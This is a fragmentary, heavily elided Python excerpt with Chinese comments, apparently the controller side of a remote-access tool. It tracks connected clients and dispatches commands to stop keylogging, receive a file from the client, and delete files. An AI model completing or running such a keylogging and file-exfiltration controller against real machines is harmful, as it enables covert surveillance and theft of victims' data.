...
first_connection = False  # 标志用于检测是否有首次连接
    ...
    with clients_lock:
        ...
        for identifier, info in client_identifiers.items():
            if identifier in clients:
                ...
                name = info["name"]
                os = info["os"]
                print(f"{identifier}: Address: {address}, {name}, {os}")
        print("----------------------------------------------------------------------------------")
...
def handle_client(conn, address):
    try:
        ...
        with clients_lock:
            ...
            client_identifiers[client_id] = {"address": address, "name": "Unknown", "os": "Unknown"}
                ...
                if command == '0':
                    ...
                    try:
                        ...
                        if command == '1':
                            ...
                            print('停止鍵盤記錄')
                            thread = threading.Thread(target=receive_file, args=(conn,))
                            thread.start()
                            thread.join()
                        elif command == '8':
                            print('刪除檔案')
        ...
        while not shutdown_flag.is_set():
            try:
                ...
                try:
                    ...
                    # 除了第一次都不要print不然畫面看起來怪怪的 有可能你正要輸入，
                    # 但突然新CLIENT進來，顯示出來之後你還是要輸入剛剛那個input，畫面很奇怪
                    # print(f"\n\n*** NEW connection from {address} ***\n")
